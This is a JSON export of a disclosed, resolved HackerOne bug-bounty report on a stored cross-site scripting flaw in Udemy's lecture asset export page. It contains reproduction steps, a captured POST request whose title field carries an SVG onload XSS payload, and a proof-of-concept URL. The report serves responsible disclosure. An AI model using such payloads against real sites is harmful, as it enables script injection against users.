{"id":62400,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82MjQwMA==","url":"https://hackerone.com/reports/62400","title":"XSS on https://www.udemy.com/asset/export.html","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2015-05-14T14:19:17.104Z","submitted_at":"2015-05-14T14:19:17.104Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"adrianbelen","url":"/adrianbelen","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/531/3af3d7d3a3d11e19dd4faa198dbf431a2a1bc758_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1566,"url":"https://hackerone.com/udemy","handle":"udemy","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/566/398b1c3549d5e2e989f232e944cde54216f910b6_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/566/398b1c3549d5e2e989f232e944cde54216f910b6_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Udemy","twitter_handle":"","website":"http://udemy.com","about":"We’re the world’s online learning marketplace, with courses in everything from programming to yoga to photography."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2015-10-08T04:05:34.907Z","bug_reporter_agreed_on_going_public_at":"2015-09-08T04:05:19.985Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"##Description\r\nhttps://www.udemy.com/asset/export.html is used to generate a content of a lecture and it will be dispalyed on https://www.udemy.com/staticx/udemy/flash/udemypresentation.player.swf?.\r\nhttps://www.udemy.com/asset/export.html contain `json response` but the content type is `text/html`, allowing the browser to render some `html tag`\r\n\r\n**Step to Reproduces**\r\n\r\n* create a new course then go to `curriculum tab`, https://www.udemy.com/course-manage/edit-curriculum?courseId=ID_here\r\n* on  lecture add new content then select presentation, the https://www.udemy.com/upload/ will upload your pdf file.\r\n* after the uploading process the new file will be added to your `Lecture` by sending a request in this url \r\nhttps://www.udemy.com/asset/add-submit/?type=Presentation containing the `file` and the `file title`.\r\nthe vulnerable parameter is the `file title` **so put your XSS payload on this parameter**\r\n\r\n**Dump Request**\r\n\r\n`POST /asset/add-submit/?type=Presentation HTTP/1.1\r\nHost: www.udemy.com\r\nConnection: keep-alive\r\nContent-Length: 301\r\nAccept: application/json, text/javascript, */*; q=0.01\r\nX-NewRelic-ID: XAcEWV5ADQIBUlNW\r\nOrigin: https://www.udemy.com\r\nX-Requested-With: XMLHttpRequest\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nDNT: 1\r\nReferer: https://www.udemy.com/course-manage/edit-curriculum?courseId=497324\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.8,et;q=0.6,fil;q=0.4`\r\n\r\n##(removed cookie)\r\n`type=Presentation\u0026title=\"\u003e\u003csvg/onload=javascript:alert(2);\u003eNeglected+DNS+Records+Exploited+To+Takeover+Subdomains+Yassine+ABOUKIR\u0026isSubmitted=1\u0026csrf=dc5d07dd336b1ab185623b1f83fd932e\u0026file=2015-05-14_06-09-55__Neglected_DNS_records_exploited_to_takeover_subdomains___Yassine_ABOUKIR.pdf\u0026displayType=ajax`\r\n\r\n* now preview the lecture as instructor or student, the flash file (https://www.udemy.com/staticx/udemy/flash/udemypresentation.player.swf) will generate a request on this endpoint -\u003e https://www.udemy.com/asset/export.html which is vulnerable to XSS \r\n\r\n\r\n###Working PoC\r\n https://www.udemy.com/asset/export.html?displayType=json\u0026uaid=E0AYcFhSR3oT\u0026uaidh=bffae6ad200b35970a667b0e2baab6e5\u0026ulid=E0ESc1laTHgT\u0026ulidh=1c92156b2841b96203cfb7f464fe4f18\u0026uuid=E0ofdFZaQ3QT\u0026uuidh=b1e2facab92aeba9d7f6936302ebf022","vulnerability_information_html":"\u003ch2 id=\"description\"\u003eDescription\u003c/h2\u003e\n\n\u003cp\u003e\u003ca title=\"https://www.udemy.com/asset/export.html\" href=\"/redirect?url=https%3A%2F%2Fwww.udemy.com%2Fasset%2Fexport.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.udemy.com/asset/export.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e is used to generate a content of a lecture and it will be dispalyed on \u003ca title=\"https://www.udemy.com/staticx/udemy/flash/udemypresentation.player.swf\" href=\"/redirect?url=https%3A%2F%2Fwww.udemy.com%2Fstaticx%2Fudemy%2Fflash%2Fudemypresentation.player.swf\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.udemy.com/staticx/udemy/flash/udemypresentation.player.swf\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e?.\u003cbr\u003e\n\u003ca title=\"https://www.udemy.com/asset/export.html\" href=\"/redirect?url=https%3A%2F%2Fwww.udemy.com%2Fasset%2Fexport.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.udemy.com/asset/export.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e contain \u003ccode\u003ejson response\u003c/code\u003e but the content type is \u003ccode\u003etext/html\u003c/code\u003e, allowing the browser to render some \u003ccode\u003ehtml tag\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eStep to Reproduces\u003c/strong\u003e\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003ecreate a new course then go to \u003ccode\u003ecurriculum tab\u003c/code\u003e, \u003ca title=\"https://www.udemy.com/course-manage/edit-curriculum?courseId=ID_here\" href=\"/redirect?url=https%3A%2F%2Fwww.udemy.com%2Fcourse-manage%2Fedit-curriculum%3FcourseId%3DID_here\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.udemy.com/course-manage/edit-curriculum?courseId=ID_here\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003eon  lecture add new content then select presentation, the \u003ca title=\"https://www.udemy.com/upload/\" href=\"/redirect?url=https%3A%2F%2Fwww.udemy.com%2Fupload%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.udemy.com/upload/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e will upload your pdf file.\u003c/li\u003e\n\u003cli\u003eafter the uploading process the new file will be added to your \u003ccode\u003eLecture\u003c/code\u003e by sending a request in this url \n\u003ca title=\"https://www.udemy.com/asset/add-submit/?type=Presentation\" href=\"/redirect?url=https%3A%2F%2Fwww.udemy.com%2Fasset%2Fadd-submit%2F%3Ftype%3DPresentation\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.udemy.com/asset/add-submit/?type=Presentation\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e containing the \u003ccode\u003efile\u003c/code\u003e and the \u003ccode\u003efile title\u003c/code\u003e.\nthe vulnerable parameter is the \u003ccode\u003efile title\u003c/code\u003e \u003cstrong\u003eso put your XSS payload on this parameter\u003c/strong\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003e\u003cstrong\u003eDump Request\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003ePOST /asset/add-submit/?type=Presentation HTTP/1.1\u003cbr\u003e\nHost: www.udemy.com\u003cbr\u003e\nConnection: keep-alive\u003cbr\u003e\nContent-Length: 301\u003cbr\u003e\nAccept: application/json, text/javascript, */*; q=0.01\u003cbr\u003e\nX-NewRelic-ID: XAcEWV5ADQIBUlNW\u003cbr\u003e\nOrigin: https://www.udemy.com\u003cbr\u003e\nX-Requested-With: XMLHttpRequest\u003cbr\u003e\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36\u003cbr\u003e\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\u003cbr\u003e\nDNT: 1\u003cbr\u003e\nReferer: https://www.udemy.com/course-manage/edit-curriculum?courseId=497324\u003cbr\u003e\nAccept-Encoding: gzip, deflate\u003cbr\u003e\nAccept-Language: en-US,en;q=0.8,et;q=0.6,fil;q=0.4\u003c/code\u003e\u003c/p\u003e\n\n\u003ch2 id=\"removed-cookie\"\u003e(removed cookie)\u003c/h2\u003e\n\n\u003cp\u003e\u003ccode\u003etype=Presentation\u0026amp;title=\u0026quot;\u0026gt;\u0026lt;svg/onload=javascript:alert(2);\u0026gt;Neglected+DNS+Records+Exploited+To+Takeover+Subdomains+Yassine+ABOUKIR\u0026amp;isSubmitted=1\u0026amp;csrf=dc5d07dd336b1ab185623b1f83fd932e\u0026amp;file=2015-05-14_06-09-55__Neglected_DNS_records_exploited_to_takeover_subdomains___Yassine_ABOUKIR.pdf\u0026amp;displayType=ajax\u003c/code\u003e\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003enow preview the lecture as instructor or student, the flash file (\u003ca title=\"https://www.udemy.com/staticx/udemy/flash/udemypresentation.player.swf\" href=\"/redirect?url=https%3A%2F%2Fwww.udemy.com%2Fstaticx%2Fudemy%2Fflash%2Fudemypresentation.player.swf\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.udemy.com/staticx/udemy/flash/udemypresentation.player.swf\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e) will generate a request on this endpoint -\u0026gt; \u003ca title=\"https://www.udemy.com/asset/export.html\" href=\"/redirect?url=https%3A%2F%2Fwww.udemy.com%2Fasset%2Fexport.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.udemy.com/asset/export.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e which is vulnerable to XSS \u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch3 id=\"working-poc\"\u003eWorking PoC\u003c/h3\u003e\n\n\u003cp\u003e\u003ca title=\"https://www.udemy.com/asset/export.html?displayType=json\u0026amp;uaid=E0AYcFhSR3oT\u0026amp;uaidh=bffae6ad200b35970a667b0e2baab6e5\u0026amp;ulid=E0ESc1laTHgT\u0026amp;ulidh=1c92156b2841b96203cfb7f464fe4f18\u0026amp;uuid=E0ofdFZaQ3QT\u0026amp;uuidh=b1e2facab92aeba9d7f6936302ebf022\" href=\"/redirect?url=https%3A%2F%2Fwww.udemy.com%2Fasset%2Fexport.html%3FdisplayType%3Djson%26uaid%3DE0AYcFhSR3oT%26uaidh%3Dbffae6ad200b35970a667b0e2baab6e5%26ulid%3DE0ESc1laTHgT%26ulidh%3D1c92156b2841b96203cfb7f464fe4f18%26uuid%3DE0ofdFZaQ3QT%26uuidh%3Db1e2facab92aeba9d7f6936302ebf022\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.udemy.com/asset/export.html?displayType=json\u0026amp;uaid=E0AYcFhSR3oT\u0026amp;uaidh=bffae6ad200b35970a667b0e2baab6e5\u0026amp;ulid=E0ESc1laTHgT\u0026amp;ulidh=1c92156b2841b96203cfb7f464fe4f18\u0026amp;uuid=E0ofdFZaQ3QT\u0026amp;uuidh=b1e2facab92aeba9d7f6936302ebf022\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","bounty_amount":"100.0","formatted_bounty":"$100","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2015-10-08T04:05:20.349Z","allow_singular_disclosure_after":-164946329.93129358,"singular_disclosure_allowed":true,"vote_count":1,"voters":["hitman_47"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":425416,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"We appreciate the time you took to submit this bug report. Due to the high volume of incoming reports, there is a delay in handling incoming security reports, please bear with us!\n\nI have triaged this report.","markdown_message":"\u003cp\u003eWe appreciate the time you took to submit this bug report. Due to the high volume of incoming reports, there is a delay in handling incoming security reports, please bear with us!\u003c/p\u003e\n\n\u003cp\u003eI have triaged this report.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-05-20T23:45:19.547Z","updated_at":"2015-05-20T23:45:19.547Z","actor":{"username":"udemybugs","cleared":false,"url":"/udemybugs","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/020/844/3e1e7c332f1e9db9d739e841a09a18ddf3bd3807_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"udemy","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":549018,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2015-08-14T18:59:25.742Z","updated_at":"2015-08-14T18:59:25.742Z","actor":{"username":"udemybugs","cleared":false,"url":"/udemybugs","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/020/844/3e1e7c332f1e9db9d739e841a09a18ddf3bd3807_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"adrianbelen","url":"/adrianbelen"},"genius_execution_id":null,"team_handle":"udemy","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":580392,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"hi!","markdown_message":"\u003cp\u003ehi!\u003c/p\u003e\n","automated_response":false,"created_at":"2015-09-08T04:05:20.064Z","updated_at":"2015-09-08T04:05:20.064Z","first_to_agree":true,"actor":{"username":"adrianbelen","cleared":false,"url":"/adrianbelen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/531/3af3d7d3a3d11e19dd4faa198dbf431a2a1bc758_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"udemy","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":582972,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2015-09-09T18:53:42.780Z","updated_at":"2015-09-09T18:53:42.780Z","actor":{"url":"/udemy","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/566/398b1c3549d5e2e989f232e944cde54216f910b6_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Udemy"}},"bounty_amount":"100.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"udemy","collaborator":{"username":"adrianbelen","url":"/adrianbelen"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":613593,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2015-10-08T04:05:34.947Z","updated_at":"2015-10-08T04:05:34.947Z","actor":{"url":"/udemy","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/566/398b1c3549d5e2e989f232e944cde54216f910b6_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Udemy"}},"genius_execution_id":null,"team_handle":"udemy","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}